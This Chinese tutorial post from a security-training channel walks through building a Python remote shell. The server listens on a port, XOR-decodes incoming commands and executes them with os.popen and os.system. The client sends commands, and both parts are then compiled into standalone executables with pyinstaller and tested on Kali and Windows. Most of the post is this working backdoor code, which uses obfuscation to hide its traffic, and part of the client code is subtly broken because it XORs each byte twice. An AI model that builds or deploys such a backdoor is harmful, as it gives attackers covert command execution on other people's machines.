> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/RfJCpIbSCsKD2WkwQnBuBA)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

作者：掌控安全学员 - 冰封小天堂

0x00: 前言  

-----------

正常一个网站分为服务端和客户端，因为是正向的，所以服务端是在目标机器上的，客户端则是攻击者机器上，

在这里要感谢 MiaGz 大师傅，这里很多都是参考了 MiaGz 大师傅的文章写出来的，进行了一点个人修改，而其中的加密方法则是参考了 hacking8.com 中 python 安全工具编写里的方法

0x01: 构造思路
----------

服务端要开启指定的监听端口，然后等待客户端来连接，s_sock.listen 决定了可以有多少客户端连接, 因为客户端发来的数据是用异或加密的。

所以我们需要用同样的异或进行解密，完成后再用 utf-8 解码，从而得到明文消息，然后判断是否是推出命令。

如果是则结束循环，外部大循环因为用的是同一个也会停止，如果想要断开后他依然运行可以将他们控制循环用的换掉

**服务端**  
import socket  
import os

#### 这部分是参数设置

#### 地址因为是本机，所以可以用空，或者 127.0.01，0.0.0.0 等方式

Host = ‘’;  
Port = 1314;

#### recv 函数接受的最大数据量

bufsize = 8000;  
将 ip 和端口作为元组里的两个元素给变量  
ipport = (Host,Port);

#### 初始化对象，设置的参数都是默认的

s_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM);

#### 绑定地址到套接字

s_sock.bind(ipport);

#### 控制最大可以有多少连接，也就是组多可以有五个客户端连接过来

s_sock.listen(5);

#### 控制循环的值

stop = False;  
while not stop:

```
#被动的接受TCP客户端的连接,返回来的是一个元组，第一个元素是对方连接设置的各种信息，给c_sock，#第二个元素则是目标ip和目标通过那个端口过来的c_sock,caddr = s_sock.accept()#将ip和端口分别给一个变量ip,port = caddr;print('%s connection....'%(ip));#死循环while True:    try:        #接受客户端发来的消息,最大数据量为bufsize变量的值        data = c_sock.recv(bufsize);    except:        #如果出现异常就关闭连接，结束循环        c_sock.close();        break;    #使用bytearray函数，将收到的数据（data）转换为一个字节数组，并且是可以修改的,给变量ceshi    ceshi = bytearray(data);    #判断数组的长度,作为终值，因为终值是小于，而且是从0开始所以刚刚好    for i in range(len(ceshi)):        #此处就是进行一个异或等于xxx,等同于ceshi[i] = ceshi[i] ^ 0x41        #按位异或运算符：当两对应的二进位相异时，结果为1,它会将两边元素转换为二进制然后运算        # 0和1为1，0和0为0，1和1为0，1和0为1，也就是转换为二进制比较时候，不一样就为1，一样就是0        ceshi[i] ^= 0x41;    #decode方法的语法：str.decode(encoding='UTF-8',errors='strict')    #decode() 方法以 encoding指定编码格式来解码字符串。默认编码为字符串编码。    values = ceshi.decode();    #如果客户端发来的消息是quit，就会返回一个True给stop，不等于则返回一个False    stop = values == 'quit' or values == 'exit';    #如果发来的是quit或者exit，就结束循环    if stop:        break;    #popen()方法语法格式：os.popen(command[, mode[, bufsize]]),command -- 使用的命令。mode -- 模式权限可以是 'r'(默认) 或 'w'    #bufsize -- 指明了文件需要的缓冲大小：0意味着无缓冲；1意味着行缓冲；其它正值表示使用参数大小的缓冲    #大概值，以字节为单位）。负的bufsize意味着使用系统的默认值，一般来说，对于tty设备，它是行缓冲；    #对于其它文件，它是全缓冲。如果没有改参数，使用系统的默认值。    #返回值为：execution succeed,中文意思是执行成功    value = os.popen(values);    #system方法，会将字符串转换成命令来执行,返回值为0，表示执行成功，返回其他的则表示失败    fh = os.system(values);    #判断执行成功没有    if fh == 0:        #调用read方法读取value的内容        value = value.read()        #如果读取的值为空，取反为真，如果读取不为空，取反为假,也就是如果是空的就给他一个字符串，如果不是空的就不用        if not value:            value = 'execution succeed';    #如果fh等于32512就提示,找不到命令    elif fh == 32512:        value = 'sh: %s: command not found'%(values);    #再次调用bytearray方法，将value转换为一个字节数组，指定使用utf-8编码    hehe = bytearray(value,'utf-8');    #将编码的数据进行异或加密    for i in range(len(hehe)):        hehe[i] ^= 0x41;    #使用send方法发送给客户端    c_sock.send(hehe);#内部循环结束的话就关闭这个连接c_sock.close();
```

#### 关闭连接

s_sock.close();

0x02: 客户端部分
-----------

客户端去连接服务端，然后把命令发给服务端，接收服务端返回的数据，在通过异或，将其还原成明文打印出来，也可以不使用这种，而直接用 base64，等其他加密，这里使用异或所以要将数据先转换成字节数组

然后一个一个字符的加密，如果使用 base64 等加密，则可以不转换成数组，直接加密一整句

这里因为要告诉服务端，我们退出了，所以需要在发送数据后判断是否退出，

因为发送的数据是加密后的，所以我们直接用未加密前的来判断，如果是退出，就结束循环关闭连接  

客户端
===

import socket  
import os

#### 输入目标地址

Host = input(‘input server ip: ‘);

##### 如果输入为空，那就设置为本地回环地址

if not Host:  
Host = ‘127.0.0.1’;

##### 连接的端口，注意是服务开启的端口才行，因为是我们过去连目标的 ip 和端口

Port = 1314;

##### addr 得到一个元组，值分别是 ip 和端口，类型为元组

addr = (Host,Port);

##### 初始化对象，设置的参数都是默认的

c_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM);

##### 设置控制循环的值

status = True;  
try:

```
#调用connect方法连接目标地址和端口c_sock.connect(addr);
```

except:

```
#如果连接失败，就执行这部分print('%s 链接出问题了'%(Host));#将控制循环的值改为Falsestatus = False;
```

#### 连接成功了执行

while status:

```
#获取要发给服务端的命令value = input('[%s] Shell > '%(Host));#将获取到的值用bytearray转换为一个字节数组，编码格式为utf-8,返回值就是  b'你的字符串'encode = bytearray(value,'utf-8');#使用len判断数组的长度，作为循环终值，因为是从0开始小于最大值，所以刚刚好for i in range(len(encode)):    #将数组的元素进行异或加密，然后在给数组，下面的相等encode[i] = encode[i] ^ 0x41;    #异或（^）会将对比的两个参数转换为二进制，然后相同为0,相异为1,在将结果转会字符串    #原理就是先转换为二进制，比如下面的，如果位数一样就是0,不一样就是1，此处用来进行加密我们发送的数据    #60 = 0011 1100    #13 = 0000 1101    #   = 0011 0001    encode[i] ^= 0x41;#如果value得值是空的就取反为真，如果不为空就取反未假#简单来说就是如果没输入东西就执行，跳过这次循环从新让你输入if not value:    continue;#如果try范围内的代码出现异常什么的就终止，然后执行except中的代码try:    #将数据发送过去    c_sock.send(encode);    #判断输入的值是否为quit，如果是就结束for循环    if value == 'quit' or value == 'exit':        break;    #使用recv方法接收TCP数据，最大接收数据量为10000    data = c_sock.recv(10000);    #将接收的数据，使用bytearray方法转换为一个字节数组，不需要参数uft-8，因为传过来的就是，加了反而有问题    ceshi = bytearray(data)    #进行一个循环解密，将收到的数据再次进行异或运算，从而还原明文    for i in range(len(ceshi)):        ceshi[i] ^= 0x41    #输出数据，并使用decode方法来将数据解码为字符串    print('%s OS : \n'%(Host),ceshi.decode());#出现异常就这行这部分except:    print('%s 断开了连接'%(Host));    #结束循环    break;
```

#### 关闭连接

c_sock.close();

0x03: 进阶思路
==========

这样一个简单的服务端和客户端就完成了，可是这种只能在装有 python 的环境下运行很不方便，

所以我们使用 pyinstaller 将他们编译成可执行文件，pyinstaller 非常方便，而且跨平台，

但是你在 linux 下编译出来的就是 linux 的，要 exe 的话要去 wind 下编译  

pyinstaller 命令有几个好用的参数，

这里介绍几个，如果感兴趣的可以自行了解一下，因为是菜鸡新手，

所以就用 - F 即可 -F 产生单个的可执行文件，也就是值有一个可执行文件，没有其他文件夹啥的

-D 产生一个目录（包含多个文件）作为可执行程序，就像一个大程序一样，有很多文件支持  
-d 产生 debug 版本的可执行文件

这里我们把客户端编译一下，会输出很多详细信息  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBCoJ0Fpn56thf50MmVI2zlHiaT5dYRWnRWpMKWzZK1ZKWH0M1rkYkxLw/640?wx_fmt=png)

编译完成后会在你所在的目录下产生三个文件夹，分别是 build、dist 和 pycache 这三个，而我们的可执行文件就被放在 dist 中，进去就可以看到  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBbxicJhth4ib6hPrCaI0MKCFq68uOef6f2Nvnj4nJWRWIVFgzQCHUhaHg/640?wx_fmt=png)

编译服务端，比如这里我是在一个新建的空文件夹中编译的  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBibJmZiaYq2M1kU5xagibuRicw2RTF25oQ63iaao8tByNdlibEibCofWeTic1RA/640?wx_fmt=png)

我们这个目录下就产生了三个文件，其中我们的可执行程序在 dist 中，服务端. spec 则是类似一个介绍文件，pycache 文件则还是产生在你 py 文件的位置哪里，

因为咱也是初学者，所以对着些并不了解，所以有些说错的地方还望指正  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBt40e3jxyHSHNUCLCiboCLSJstzaiblgYMvwMWGsSYczh5CoeRZHzhelg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBKoOX49icZLeIVibrPPgkUG6hTx75JQ2nQKGaic7rREv156nSBdGWyKficw/640?wx_fmt=png)

0x04: 测试实例
==========

测试是否可运行，先将服务端复制到另一个 kali 下，并给他执行权限  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXB3scwxM5FQkmUvr3o7eLgt7wB6m8qBviaUiaHdRDnXg2z0zm3Y3ibSEA5A/640?wx_fmt=png)

运行起来，没有报错保持这个就表示没问题  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBlfWEta7YXk5ia1t8P9DIrjf3jgSHLfiaM2kDQAtOsHzZ9GiaicM5ILSh9w/640?wx_fmt=png)

启动客户端来连接，发现可以单独启动，说明编译的没有问题  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBR14aFbG4SjeYvyBOjdNqMe920AWc7gbC2zHj1ibfQxtWEvdM9FtDvZw/640?wx_fmt=png)

此处我也在 wind 下编译了一个服务端，然后尝试用 kali 上的客户端去连接也没有问题  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBRAN0xEZdcwHOJWlVOlHWHEmKK7PsWlribUcKr9bBWSe9YWWwHoFzd1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBla3PN6lpag4tIBHcfG8Dtiam2d5oZEEYgicmcLhZpk6CiclLj8nCNrRaw/640?wx_fmt=png)

不过在 wind 下有个小问题，那就是如果输入不存在的命令会直接断开，后来检查了代码，发现这里只设置了 if 和 elif，并没有遇到第三种情况，所以导致他就直接中断了，所以将服务端加入一个 else 条件即可

  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBOrWU0YXOygpZASu0WsUmZtywib6iazGKp5Xgu89lKvicyricWrSlGvibozg/640?wx_fmt=png)

可以看到这下在任何情况下输入错误的命令也不会断开了

  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBSalTZm3EGT71dS38QVG39FM3gdaja7k1NSoLdiaVGNBPko4ITIqhBMQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqL5iayV1kzCxP6lRAsJiaibXBfIohq56PbIaYy8FjRRXVSfI79pcfVcbqVQE1iaYFW391AfPibrWbic2mA/640?wx_fmt=png)

  

**回顾往期内容**

[一起来学 PHP 代码审计（一）入门](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487858&idx=1&sn=47c58061798afda9f50d6a3b838f184e&chksm=fa686803cd1fe115a3af2e3b1e42717dcc6d8751c888d686389f6909695b0ae0e1f4d58e24b3&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[新时代的渗透思路！微服务下的信息搜集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487493&idx=1&sn=9ca65b3b6098dfa4d53a0d60be4bee51&chksm=fa686974cd1fe062500e5afb03a0181a1d731819f7535c36b61c05b3c6144807e0a76a0130c5&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[反杀黑客 — 还敢连 shell 吗？蚁剑 RCE 第二回合~](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247485574&idx=1&sn=d951b776d34bfed739eb5c6ce0b64d3b&chksm=fa6871f7cd1ff8e14ad7eef3de23e72c622ff5a374777c1c65053a83a49ace37523ac68d06a1&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[防溯源防水表—APT 渗透攻击红队行动保障](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487533&idx=1&sn=30e8baddac59f7dc47ae87cf5db299e9&chksm=fa68695ccd1fe04af7877a2855883f4b08872366842841afdf5f506f872bab24ad7c0f30523c&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**
